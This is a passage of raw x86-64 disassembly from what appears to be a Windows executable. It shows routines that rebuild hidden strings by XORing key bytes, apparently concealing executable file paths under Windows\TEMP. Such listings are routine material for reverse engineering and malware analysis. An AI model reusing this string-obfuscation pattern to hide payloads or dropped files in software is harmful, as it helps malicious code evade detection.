   1400024b5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400024ba:	34 77                	xor    $0x77,%al
   1400024bc:	41 88 40 08          	mov    %al,0x8(%r8)
   1400024c0:	4c 8b c3             	mov    %rbx,%r8
   1400024c3:	48 83 3d 15 4a 02 00 	cmpq   $0xf,0x24a15(%rip)        # 0x140026ee0
   1400024ca:	0f 
   1400024cb:	b8 09 00 00 00       	mov    $0x9,%eax
   1400024d0:	4c 0f 47 05 f0 49 02 	cmova  0x249f0(%rip),%r8        # 0x140026ec8
   1400024d7:	00 
   1400024d8:	33 d2                	xor    %edx,%edx
   1400024da:	48 f7 f1             	div    %rcx
   1400024dd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400024e2:	34 73                	xor    $0x73,%al
   1400024e4:	41 88 40 09          	mov    %al,0x9(%r8)
   1400024e8:	4c 8b c3             	mov    %rbx,%r8
   1400024eb:	48 83 3d ed 49 02 00 	cmpq   $0xf,0x249ed(%rip)        # 0x140026ee0
   1400024f2:	0f 
   1400024f3:	b8 0a 00 00 00       	mov    $0xa,%eax
   1400024f8:	4c 0f 47 05 c8 49 02 	cmova  0x249c8(%rip),%r8        # 0x140026ec8
   1400024ff:	00 
   140002500:	33 d2                	xor    %edx,%edx
   140002502:	48 f7 f1             	div    %rcx
   140002505:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000250a:	34 5c                	xor    $0x5c,%al
   14000250c:	41 88 40 0a          	mov    %al,0xa(%r8)
   140002510:	4c 8b c3             	mov    %rbx,%r8
   140002513:	48 83 3d c5 49 02 00 	cmpq   $0xf,0x249c5(%rip)        # 0x140026ee0
   14000251a:	0f 
   14000251b:	b8 0b 00 00 00       	mov    $0xb,%eax
   140002520:	4c 0f 47 05 a0 49 02 	cmova  0x249a0(%rip),%r8        # 0x140026ec8
   140002527:	00 
   140002528:	33 d2                	xor    %edx,%edx
   14000252a:	48 f7 f1             	div    %rcx
   14000252d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002532:	34 54                	xor    $0x54,%al
   140002534:	41 88 40 0b          	mov    %al,0xb(%r8)
   140002538:	4c 8b c3             	mov    %rbx,%r8
   14000253b:	48 83 3d 9d 49 02 00 	cmpq   $0xf,0x2499d(%rip)        # 0x140026ee0
   140002542:	0f 
   140002543:	b8 0c 00 00 00       	mov    $0xc,%eax
   140002548:	4c 0f 47 05 78 49 02 	cmova  0x24978(%rip),%r8        # 0x140026ec8
   14000254f:	00 
   140002550:	33 d2                	xor    %edx,%edx
   140002552:	48 f7 f1             	div    %rcx
   140002555:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000255a:	34 45                	xor    $0x45,%al
   14000255c:	41 88 40 0c          	mov    %al,0xc(%r8)
   140002560:	4c 8b c3             	mov    %rbx,%r8
   140002563:	48 83 3d 75 49 02 00 	cmpq   $0xf,0x24975(%rip)        # 0x140026ee0
   14000256a:	0f 
   14000256b:	b8 0d 00 00 00       	mov    $0xd,%eax
   140002570:	4c 0f 47 05 50 49 02 	cmova  0x24950(%rip),%r8        # 0x140026ec8
   140002577:	00 
   140002578:	33 d2                	xor    %edx,%edx
   14000257a:	48 f7 f1             	div    %rcx
   14000257d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002582:	34 4d                	xor    $0x4d,%al
   140002584:	41 88 40 0d          	mov    %al,0xd(%r8)
   140002588:	4c 8b c3             	mov    %rbx,%r8
   14000258b:	48 83 3d 4d 49 02 00 	cmpq   $0xf,0x2494d(%rip)        # 0x140026ee0
   140002592:	0f 
   140002593:	b8 0e 00 00 00       	mov    $0xe,%eax
   140002598:	4c 0f 47 05 28 49 02 	cmova  0x24928(%rip),%r8        # 0x140026ec8
   14000259f:	00 
   1400025a0:	33 d2                	xor    %edx,%edx
   1400025a2:	48 f7 f1             	div    %rcx
   1400025a5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400025aa:	34 50                	xor    $0x50,%al
   1400025ac:	41 88 40 0e          	mov    %al,0xe(%r8)
   1400025b0:	4c 8b c3             	mov    %rbx,%r8
   1400025b3:	48 83 3d 25 49 02 00 	cmpq   $0xf,0x24925(%rip)        # 0x140026ee0
   1400025ba:	0f 
   1400025bb:	b8 0f 00 00 00       	mov    $0xf,%eax
   1400025c0:	4c 0f 47 05 00 49 02 	cmova  0x24900(%rip),%r8        # 0x140026ec8
   1400025c7:	00 
   1400025c8:	33 d2                	xor    %edx,%edx
   1400025ca:	48 f7 f1             	div    %rcx
   1400025cd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400025d2:	34 5c                	xor    $0x5c,%al
   1400025d4:	41 88 40 0f          	mov    %al,0xf(%r8)
   1400025d8:	4c 8b c3             	mov    %rbx,%r8
   1400025db:	48 83 3d fd 48 02 00 	cmpq   $0xf,0x248fd(%rip)        # 0x140026ee0
   1400025e2:	0f 
   1400025e3:	b8 10 00 00 00       	mov    $0x10,%eax
   1400025e8:	4c 0f 47 05 d8 48 02 	cmova  0x248d8(%rip),%r8        # 0x140026ec8
   1400025ef:	00 
   1400025f0:	33 d2                	xor    %edx,%edx
   1400025f2:	48 f7 f1             	div    %rcx
   1400025f5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400025fa:	34 67                	xor    $0x67,%al
   1400025fc:	41 88 40 10          	mov    %al,0x10(%r8)
   140002600:	4c 8b c3             	mov    %rbx,%r8
   140002603:	48 83 3d d5 48 02 00 	cmpq   $0xf,0x248d5(%rip)        # 0x140026ee0
   14000260a:	0f 
   14000260b:	b8 11 00 00 00       	mov    $0x11,%eax
   140002610:	4c 0f 47 05 b0 48 02 	cmova  0x248b0(%rip),%r8        # 0x140026ec8
   140002617:	00 
   140002618:	33 d2                	xor    %edx,%edx
   14000261a:	48 f7 f1             	div    %rcx
   14000261d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002622:	34 69                	xor    $0x69,%al
   140002624:	41 88 40 11          	mov    %al,0x11(%r8)
   140002628:	4c 8b c3             	mov    %rbx,%r8
   14000262b:	48 83 3d ad 48 02 00 	cmpq   $0xf,0x248ad(%rip)        # 0x140026ee0
   140002632:	0f 
   140002633:	b8 12 00 00 00       	mov    $0x12,%eax
   140002638:	4c 0f 47 05 88 48 02 	cmova  0x24888(%rip),%r8        # 0x140026ec8
   14000263f:	00 
   140002640:	33 d2                	xor    %edx,%edx
   140002642:	48 f7 f1             	div    %rcx
   140002645:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000264a:	34 61                	xor    $0x61,%al
   14000264c:	41 88 40 12          	mov    %al,0x12(%r8)
   140002650:	4c 8b c3             	mov    %rbx,%r8
   140002653:	48 83 3d 85 48 02 00 	cmpq   $0xf,0x24885(%rip)        # 0x140026ee0
   14000265a:	0f 
   14000265b:	b8 13 00 00 00       	mov    $0x13,%eax
   140002660:	4c 0f 47 05 60 48 02 	cmova  0x24860(%rip),%r8        # 0x140026ec8
   140002667:	00 
   140002668:	33 d2                	xor    %edx,%edx
   14000266a:	48 f7 f1             	div    %rcx
   14000266d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002672:	34 6e                	xor    $0x6e,%al
   140002674:	41 88 40 13          	mov    %al,0x13(%r8)
   140002678:	4c 8b c3             	mov    %rbx,%r8
   14000267b:	48 83 3d 5d 48 02 00 	cmpq   $0xf,0x2485d(%rip)        # 0x140026ee0
   140002682:	0f 
   140002683:	b8 14 00 00 00       	mov    $0x14,%eax
   140002688:	4c 0f 47 05 38 48 02 	cmova  0x24838(%rip),%r8        # 0x140026ec8
   14000268f:	00 
   140002690:	33 d2                	xor    %edx,%edx
   140002692:	48 f7 f1             	div    %rcx
   140002695:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000269a:	34 6e                	xor    $0x6e,%al
   14000269c:	41 88 40 14          	mov    %al,0x14(%r8)
   1400026a0:	4c 8b c3             	mov    %rbx,%r8
   1400026a3:	48 83 3d 35 48 02 00 	cmpq   $0xf,0x24835(%rip)        # 0x140026ee0
   1400026aa:	0f 
   1400026ab:	b8 15 00 00 00       	mov    $0x15,%eax
   1400026b0:	4c 0f 47 05 10 48 02 	cmova  0x24810(%rip),%r8        # 0x140026ec8
   1400026b7:	00 
   1400026b8:	33 d2                	xor    %edx,%edx
   1400026ba:	48 f7 f1             	div    %rcx
   1400026bd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400026c2:	34 69                	xor    $0x69,%al
   1400026c4:	41 88 40 15          	mov    %al,0x15(%r8)
   1400026c8:	4c 8b c3             	mov    %rbx,%r8
   1400026cb:	48 83 3d 0d 48 02 00 	cmpq   $0xf,0x2480d(%rip)        # 0x140026ee0
   1400026d2:	0f 
   1400026d3:	b8 16 00 00 00       	mov    $0x16,%eax
   1400026d8:	4c 0f 47 05 e8 47 02 	cmova  0x247e8(%rip),%r8        # 0x140026ec8
   1400026df:	00 
   1400026e0:	33 d2                	xor    %edx,%edx
   1400026e2:	48 f7 f1             	div    %rcx
   1400026e5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400026ea:	34 33                	xor    $0x33,%al
   1400026ec:	41 88 40 16          	mov    %al,0x16(%r8)
   1400026f0:	4c 8b c3             	mov    %rbx,%r8
   1400026f3:	48 83 3d e5 47 02 00 	cmpq   $0xf,0x247e5(%rip)        # 0x140026ee0
   1400026fa:	0f 
   1400026fb:	b8 17 00 00 00       	mov    $0x17,%eax
   140002700:	4c 0f 47 05 c0 47 02 	cmova  0x247c0(%rip),%r8        # 0x140026ec8
   140002707:	00 
   140002708:	33 d2                	xor    %edx,%edx
   14000270a:	48 f7 f1             	div    %rcx
   14000270d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002712:	34 2e                	xor    $0x2e,%al
   140002714:	41 88 40 17          	mov    %al,0x17(%r8)
   140002718:	4c 8b c3             	mov    %rbx,%r8
   14000271b:	48 83 3d bd 47 02 00 	cmpq   $0xf,0x247bd(%rip)        # 0x140026ee0
   140002722:	0f 
   140002723:	b8 18 00 00 00       	mov    $0x18,%eax
   140002728:	4c 0f 47 05 98 47 02 	cmova  0x24798(%rip),%r8        # 0x140026ec8
   14000272f:	00 
   140002730:	33 d2                	xor    %edx,%edx
   140002732:	48 f7 f1             	div    %rcx
   140002735:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000273a:	34 65                	xor    $0x65,%al
   14000273c:	41 88 40 18          	mov    %al,0x18(%r8)
   140002740:	4c 8b c3             	mov    %rbx,%r8
   140002743:	48 83 3d 95 47 02 00 	cmpq   $0xf,0x24795(%rip)        # 0x140026ee0
   14000274a:	0f 
   14000274b:	b8 19 00 00 00       	mov    $0x19,%eax
   140002750:	4c 0f 47 05 70 47 02 	cmova  0x24770(%rip),%r8        # 0x140026ec8
   140002757:	00 
   140002758:	33 d2                	xor    %edx,%edx
   14000275a:	48 f7 f1             	div    %rcx
   14000275d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002762:	34 78                	xor    $0x78,%al
   140002764:	41 88 40 19          	mov    %al,0x19(%r8)
   140002768:	4c 8b c3             	mov    %rbx,%r8
   14000276b:	48 83 3d 6d 47 02 00 	cmpq   $0xf,0x2476d(%rip)        # 0x140026ee0
   140002772:	0f 
   140002773:	b8 1a 00 00 00       	mov    $0x1a,%eax
   140002778:	4c 0f 47 05 48 47 02 	cmova  0x24748(%rip),%r8        # 0x140026ec8
   14000277f:	00 
   140002780:	33 d2                	xor    %edx,%edx
   140002782:	48 f7 f1             	div    %rcx
   140002785:	48 8b c3             	mov    %rbx,%rax
   140002788:	42 0f b6 0c 0a       	movzbl (%rdx,%r9,1),%ecx
   14000278d:	80 f1 65             	xor    $0x65,%cl
   140002790:	41 88 48 1a          	mov    %cl,0x1a(%r8)
   140002794:	48 83 c4 30          	add    $0x30,%rsp
   140002798:	5b                   	pop    %rbx
   140002799:	c3                   	ret
   14000279a:	cc                   	int3
   14000279b:	cc                   	int3
   14000279c:	cc                   	int3
   14000279d:	cc                   	int3
   14000279e:	cc                   	int3
   14000279f:	cc                   	int3
   1400027a0:	40 53                	rex push %rbx
   1400027a2:	48 83 ec 30          	sub    $0x30,%rsp
   1400027a6:	48 8d 1d 7b 47 02 00 	lea    0x2477b(%rip),%rbx        # 0x140026f28
   1400027ad:	ba 1b 00 00 00       	mov    $0x1b,%edx
   1400027b2:	48 8b cb             	mov    %rbx,%rcx
   1400027b5:	e8 56 3b 00 00       	call   0x140006310
   1400027ba:	4c 8d 0d 0f c1 00 00 	lea    0xc10f(%rip),%r9        # 0x14000e8d0
   1400027c1:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   1400027c8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400027cf:	00 
   1400027d0:	48 ff c1             	inc    %rcx
   1400027d3:	41 80 3c 09 00       	cmpb   $0x0,(%r9,%rcx,1)
   1400027d8:	75 f6                	jne    0x1400027d0
   1400027da:	48 83 3d 5e 47 02 00 	cmpq   $0xf,0x2475e(%rip)        # 0x140026f40
   1400027e1:	0f 
   1400027e2:	48 8b c3             	mov    %rbx,%rax
   1400027e5:	4c 8b c3             	mov    %rbx,%r8
   1400027e8:	48 0f 47 05 38 47 02 	cmova  0x24738(%rip),%rax        # 0x140026f28
   1400027ef:	00 
   1400027f0:	c6 00 25             	movb   $0x25,(%rax)
   1400027f3:	b8 01 00 00 00       	mov    $0x1,%eax
   1400027f8:	48 83 3d 40 47 02 00 	cmpq   $0xf,0x24740(%rip)        # 0x140026f40
   1400027ff:	0f 
   140002800:	4c 0f 47 05 20 47 02 	cmova  0x24720(%rip),%r8        # 0x140026f28
   140002807:	00 
   140002808:	33 d2                	xor    %edx,%edx
   14000280a:	48 f7 f1             	div    %rcx
   14000280d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002812:	34 3a                	xor    $0x3a,%al
   140002814:	41 88 40 01          	mov    %al,0x1(%r8)
   140002818:	4c 8b c3             	mov    %rbx,%r8
   14000281b:	48 83 3d 1d 47 02 00 	cmpq   $0xf,0x2471d(%rip)        # 0x140026f40
   140002822:	0f 
   140002823:	b8 02 00 00 00       	mov    $0x2,%eax
   140002828:	4c 0f 47 05 f8 46 02 	cmova  0x246f8(%rip),%r8        # 0x140026f28
   14000282f:	00 
   140002830:	33 d2                	xor    %edx,%edx
   140002832:	48 f7 f1             	div    %rcx
   140002835:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000283a:	34 5c                	xor    $0x5c,%al
   14000283c:	41 88 40 02          	mov    %al,0x2(%r8)
   140002840:	4c 8b c3             	mov    %rbx,%r8
   140002843:	48 83 3d f5 46 02 00 	cmpq   $0xf,0x246f5(%rip)        # 0x140026f40
   14000284a:	0f 
   14000284b:	b8 03 00 00 00       	mov    $0x3,%eax
   140002850:	4c 0f 47 05 d0 46 02 	cmova  0x246d0(%rip),%r8        # 0x140026f28
   140002857:	00 
   140002858:	33 d2                	xor    %edx,%edx
   14000285a:	48 f7 f1             	div    %rcx
   14000285d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002862:	34 57                	xor    $0x57,%al
   140002864:	41 88 40 03          	mov    %al,0x3(%r8)
   140002868:	4c 8b c3             	mov    %rbx,%r8
   14000286b:	48 83 3d cd 46 02 00 	cmpq   $0xf,0x246cd(%rip)        # 0x140026f40
   140002872:	0f 
   140002873:	b8 04 00 00 00       	mov    $0x4,%eax
   140002878:	4c 0f 47 05 a8 46 02 	cmova  0x246a8(%rip),%r8        # 0x140026f28
   14000287f:	00 
   140002880:	33 d2                	xor    %edx,%edx
   140002882:	48 f7 f1             	div    %rcx
   140002885:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000288a:	34 69                	xor    $0x69,%al
   14000288c:	41 88 40 04          	mov    %al,0x4(%r8)
   140002890:	4c 8b c3             	mov    %rbx,%r8
   140002893:	48 83 3d a5 46 02 00 	cmpq   $0xf,0x246a5(%rip)        # 0x140026f40
   14000289a:	0f 
   14000289b:	b8 05 00 00 00       	mov    $0x5,%eax
   1400028a0:	4c 0f 47 05 80 46 02 	cmova  0x24680(%rip),%r8        # 0x140026f28
   1400028a7:	00 
   1400028a8:	33 d2                	xor    %edx,%edx
   1400028aa:	48 f7 f1             	div    %rcx
   1400028ad:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400028b2:	34 6e                	xor    $0x6e,%al
   1400028b4:	41 88 40 05          	mov    %al,0x5(%r8)
   1400028b8:	4c 8b c3             	mov    %rbx,%r8
   1400028bb:	48 83 3d 7d 46 02 00 	cmpq   $0xf,0x2467d(%rip)        # 0x140026f40
   1400028c2:	0f 
   1400028c3:	b8 06 00 00 00       	mov    $0x6,%eax
   1400028c8:	4c 0f 47 05 58 46 02 	cmova  0x24658(%rip),%r8        # 0x140026f28
   1400028cf:	00 
   1400028d0:	33 d2                	xor    %edx,%edx
   1400028d2:	48 f7 f1             	div    %rcx
   1400028d5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400028da:	34 64                	xor    $0x64,%al
   1400028dc:	41 88 40 06          	mov    %al,0x6(%r8)
   1400028e0:	4c 8b c3             	mov    %rbx,%r8
   1400028e3:	48 83 3d 55 46 02 00 	cmpq   $0xf,0x24655(%rip)        # 0x140026f40
   1400028ea:	0f 
   1400028eb:	b8 07 00 00 00       	mov    $0x7,%eax
   1400028f0:	4c 0f 47 05 30 46 02 	cmova  0x24630(%rip),%r8        # 0x140026f28
   1400028f7:	00 
   1400028f8:	33 d2                	xor    %edx,%edx
   1400028fa:	48 f7 f1             	div    %rcx
   1400028fd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002902:	34 6f                	xor    $0x6f,%al
   140002904:	41 88 40 07          	mov    %al,0x7(%r8)
   140002908:	4c 8b c3             	mov    %rbx,%r8
   14000290b:	48 83 3d 2d 46 02 00 	cmpq   $0xf,0x2462d(%rip)        # 0x140026f40
   140002912:	0f 
   140002913:	b8 08 00 00 00       	mov    $0x8,%eax
   140002918:	4c 0f 47 05 08 46 02 	cmova  0x24608(%rip),%r8        # 0x140026f28
   14000291f:	00 
   140002920:	33 d2                	xor    %edx,%edx
   140002922:	48 f7 f1             	div    %rcx
   140002925:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000292a:	34 77                	xor    $0x77,%al
   14000292c:	41 88 40 08          	mov    %al,0x8(%r8)
   140002930:	4c 8b c3             	mov    %rbx,%r8
   140002933:	48 83 3d 05 46 02 00 	cmpq   $0xf,0x24605(%rip)        # 0x140026f40
   14000293a:	0f 
   14000293b:	b8 09 00 00 00       	mov    $0x9,%eax
   140002940:	4c 0f 47 05 e0 45 02 	cmova  0x245e0(%rip),%r8        # 0x140026f28
   140002947:	00 
   140002948:	33 d2                	xor    %edx,%edx
   14000294a:	48 f7 f1             	div    %rcx
   14000294d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002952:	34 73                	xor    $0x73,%al
   140002954:	41 88 40 09          	mov    %al,0x9(%r8)
   140002958:	4c 8b c3             	mov    %rbx,%r8
   14000295b:	48 83 3d dd 45 02 00 	cmpq   $0xf,0x245dd(%rip)        # 0x140026f40
   140002962:	0f 
   140002963:	b8 0a 00 00 00       	mov    $0xa,%eax
   140002968:	4c 0f 47 05 b8 45 02 	cmova  0x245b8(%rip),%r8        # 0x140026f28
   14000296f:	00 
   140002970:	33 d2                	xor    %edx,%edx
   140002972:	48 f7 f1             	div    %rcx
   140002975:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   14000297a:	34 5c                	xor    $0x5c,%al
   14000297c:	41 88 40 0a          	mov    %al,0xa(%r8)
   140002980:	4c 8b c3             	mov    %rbx,%r8
   140002983:	48 83 3d b5 45 02 00 	cmpq   $0xf,0x245b5(%rip)        # 0x140026f40
   14000298a:	0f 
   14000298b:	b8 0b 00 00 00       	mov    $0xb,%eax
   140002990:	4c 0f 47 05 90 45 02 	cmova  0x24590(%rip),%r8        # 0x140026f28
   140002997:	00 
   140002998:	33 d2                	xor    %edx,%edx
   14000299a:	48 f7 f1             	div    %rcx
   14000299d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400029a2:	34 54                	xor    $0x54,%al
   1400029a4:	41 88 40 0b          	mov    %al,0xb(%r8)
   1400029a8:	4c 8b c3             	mov    %rbx,%r8
   1400029ab:	48 83 3d 8d 45 02 00 	cmpq   $0xf,0x2458d(%rip)        # 0x140026f40
   1400029b2:	0f 
   1400029b3:	b8 0c 00 00 00       	mov    $0xc,%eax
   1400029b8:	4c 0f 47 05 68 45 02 	cmova  0x24568(%rip),%r8        # 0x140026f28
   1400029bf:	00 
   1400029c0:	33 d2                	xor    %edx,%edx
   1400029c2:	48 f7 f1             	div    %rcx
   1400029c5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400029ca:	34 45                	xor    $0x45,%al
   1400029cc:	41 88 40 0c          	mov    %al,0xc(%r8)
   1400029d0:	4c 8b c3             	mov    %rbx,%r8
   1400029d3:	48 83 3d 65 45 02 00 	cmpq   $0xf,0x24565(%rip)        # 0x140026f40
   1400029da:	0f 
   1400029db:	b8 0d 00 00 00       	mov    $0xd,%eax
   1400029e0:	4c 0f 47 05 40 45 02 	cmova  0x24540(%rip),%r8        # 0x140026f28
   1400029e7:	00 
   1400029e8:	33 d2                	xor    %edx,%edx
   1400029ea:	48 f7 f1             	div    %rcx
   1400029ed:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   1400029f2:	34 4d                	xor    $0x4d,%al
   1400029f4:	41 88 40 0d          	mov    %al,0xd(%r8)
   1400029f8:	4c 8b c3             	mov    %rbx,%r8
   1400029fb:	48 83 3d 3d 45 02 00 	cmpq   $0xf,0x2453d(%rip)        # 0x140026f40
   140002a02:	0f 
   140002a03:	b8 0e 00 00 00       	mov    $0xe,%eax
   140002a08:	4c 0f 47 05 18 45 02 	cmova  0x24518(%rip),%r8        # 0x140026f28
   140002a0f:	00 
   140002a10:	33 d2                	xor    %edx,%edx
   140002a12:	48 f7 f1             	div    %rcx
   140002a15:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002a1a:	34 50                	xor    $0x50,%al
   140002a1c:	41 88 40 0e          	mov    %al,0xe(%r8)
   140002a20:	4c 8b c3             	mov    %rbx,%r8
   140002a23:	48 83 3d 15 45 02 00 	cmpq   $0xf,0x24515(%rip)        # 0x140026f40
   140002a2a:	0f 
   140002a2b:	b8 0f 00 00 00       	mov    $0xf,%eax
   140002a30:	4c 0f 47 05 f0 44 02 	cmova  0x244f0(%rip),%r8        # 0x140026f28
   140002a37:	00 
   140002a38:	33 d2                	xor    %edx,%edx
   140002a3a:	48 f7 f1             	div    %rcx
   140002a3d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002a42:	34 5c                	xor    $0x5c,%al
   140002a44:	41 88 40 0f          	mov    %al,0xf(%r8)
   140002a48:	4c 8b c3             	mov    %rbx,%r8
   140002a4b:	48 83 3d ed 44 02 00 	cmpq   $0xf,0x244ed(%rip)        # 0x140026f40
   140002a52:	0f 
   140002a53:	b8 10 00 00 00       	mov    $0x10,%eax
   140002a58:	4c 0f 47 05 c8 44 02 	cmova  0x244c8(%rip),%r8        # 0x140026f28
   140002a5f:	00 
   140002a60:	33 d2                	xor    %edx,%edx
   140002a62:	48 f7 f1             	div    %rcx
   140002a65:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002a6a:	34 67                	xor    $0x67,%al
   140002a6c:	41 88 40 10          	mov    %al,0x10(%r8)
   140002a70:	4c 8b c3             	mov    %rbx,%r8
   140002a73:	48 83 3d c5 44 02 00 	cmpq   $0xf,0x244c5(%rip)        # 0x140026f40
   140002a7a:	0f 
   140002a7b:	b8 11 00 00 00       	mov    $0x11,%eax
   140002a80:	4c 0f 47 05 a0 44 02 	cmova  0x244a0(%rip),%r8        # 0x140026f28
   140002a87:	00 
   140002a88:	33 d2                	xor    %edx,%edx
   140002a8a:	48 f7 f1             	div    %rcx
   140002a8d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002a92:	34 69                	xor    $0x69,%al
   140002a94:	41 88 40 11          	mov    %al,0x11(%r8)
   140002a98:	4c 8b c3             	mov    %rbx,%r8
   140002a9b:	48 83 3d 9d 44 02 00 	cmpq   $0xf,0x2449d(%rip)        # 0x140026f40
   140002aa2:	0f 
   140002aa3:	b8 12 00 00 00       	mov    $0x12,%eax
   140002aa8:	4c 0f 47 05 78 44 02 	cmova  0x24478(%rip),%r8        # 0x140026f28
   140002aaf:	00 
   140002ab0:	33 d2                	xor    %edx,%edx
   140002ab2:	48 f7 f1             	div    %rcx
   140002ab5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002aba:	34 61                	xor    $0x61,%al
   140002abc:	41 88 40 12          	mov    %al,0x12(%r8)
   140002ac0:	4c 8b c3             	mov    %rbx,%r8
   140002ac3:	48 83 3d 75 44 02 00 	cmpq   $0xf,0x24475(%rip)        # 0x140026f40
   140002aca:	0f 
   140002acb:	b8 13 00 00 00       	mov    $0x13,%eax
   140002ad0:	4c 0f 47 05 50 44 02 	cmova  0x24450(%rip),%r8        # 0x140026f28
   140002ad7:	00 
   140002ad8:	33 d2                	xor    %edx,%edx
   140002ada:	48 f7 f1             	div    %rcx
   140002add:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002ae2:	34 6e                	xor    $0x6e,%al
   140002ae4:	41 88 40 13          	mov    %al,0x13(%r8)
   140002ae8:	4c 8b c3             	mov    %rbx,%r8
   140002aeb:	48 83 3d 4d 44 02 00 	cmpq   $0xf,0x2444d(%rip)        # 0x140026f40
   140002af2:	0f 
   140002af3:	b8 14 00 00 00       	mov    $0x14,%eax
   140002af8:	4c 0f 47 05 28 44 02 	cmova  0x24428(%rip),%r8        # 0x140026f28
   140002aff:	00 
   140002b00:	33 d2                	xor    %edx,%edx
   140002b02:	48 f7 f1             	div    %rcx
   140002b05:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002b0a:	34 6e                	xor    $0x6e,%al
   140002b0c:	41 88 40 14          	mov    %al,0x14(%r8)
   140002b10:	4c 8b c3             	mov    %rbx,%r8
   140002b13:	48 83 3d 25 44 02 00 	cmpq   $0xf,0x24425(%rip)        # 0x140026f40
   140002b1a:	0f 
   140002b1b:	b8 15 00 00 00       	mov    $0x15,%eax
   140002b20:	4c 0f 47 05 00 44 02 	cmova  0x24400(%rip),%r8        # 0x140026f28
   140002b27:	00 
   140002b28:	33 d2                	xor    %edx,%edx
   140002b2a:	48 f7 f1             	div    %rcx
   140002b2d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002b32:	34 69                	xor    $0x69,%al
   140002b34:	41 88 40 15          	mov    %al,0x15(%r8)
   140002b38:	4c 8b c3             	mov    %rbx,%r8
   140002b3b:	48 83 3d fd 43 02 00 	cmpq   $0xf,0x243fd(%rip)        # 0x140026f40
   140002b42:	0f 
   140002b43:	b8 16 00 00 00       	mov    $0x16,%eax
   140002b48:	4c 0f 47 05 d8 43 02 	cmova  0x243d8(%rip),%r8        # 0x140026f28
   140002b4f:	00 
   140002b50:	33 d2                	xor    %edx,%edx
   140002b52:	48 f7 f1             	div    %rcx
   140002b55:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002b5a:	34 34                	xor    $0x34,%al
   140002b5c:	41 88 40 16          	mov    %al,0x16(%r8)
   140002b60:	4c 8b c3             	mov    %rbx,%r8
   140002b63:	48 83 3d d5 43 02 00 	cmpq   $0xf,0x243d5(%rip)        # 0x140026f40
   140002b6a:	0f 
   140002b6b:	b8 17 00 00 00       	mov    $0x17,%eax
   140002b70:	4c 0f 47 05 b0 43 02 	cmova  0x243b0(%rip),%r8        # 0x140026f28
   140002b77:	00 
   140002b78:	33 d2                	xor    %edx,%edx
   140002b7a:	48 f7 f1             	div    %rcx
   140002b7d:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002b82:	34 2e                	xor    $0x2e,%al
   140002b84:	41 88 40 17          	mov    %al,0x17(%r8)
   140002b88:	4c 8b c3             	mov    %rbx,%r8
   140002b8b:	48 83 3d ad 43 02 00 	cmpq   $0xf,0x243ad(%rip)        # 0x140026f40
   140002b92:	0f 
   140002b93:	b8 18 00 00 00       	mov    $0x18,%eax
   140002b98:	4c 0f 47 05 88 43 02 	cmova  0x24388(%rip),%r8        # 0x140026f28
   140002b9f:	00 
   140002ba0:	33 d2                	xor    %edx,%edx
   140002ba2:	48 f7 f1             	div    %rcx
   140002ba5:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002baa:	34 65                	xor    $0x65,%al
   140002bac:	41 88 40 18          	mov    %al,0x18(%r8)
   140002bb0:	4c 8b c3             	mov    %rbx,%r8
   140002bb3:	48 83 3d 85 43 02 00 	cmpq   $0xf,0x24385(%rip)        # 0x140026f40
   140002bba:	0f 
   140002bbb:	b8 19 00 00 00       	mov    $0x19,%eax
   140002bc0:	4c 0f 47 05 60 43 02 	cmova  0x24360(%rip),%r8        # 0x140026f28
   140002bc7:	00 
   140002bc8:	33 d2                	xor    %edx,%edx
   140002bca:	48 f7 f1             	div    %rcx
   140002bcd:	42 0f b6 04 0a       	movzbl (%rdx,%r9,1),%eax
   140002bd2:	34 78                	xor    $0x78,%al
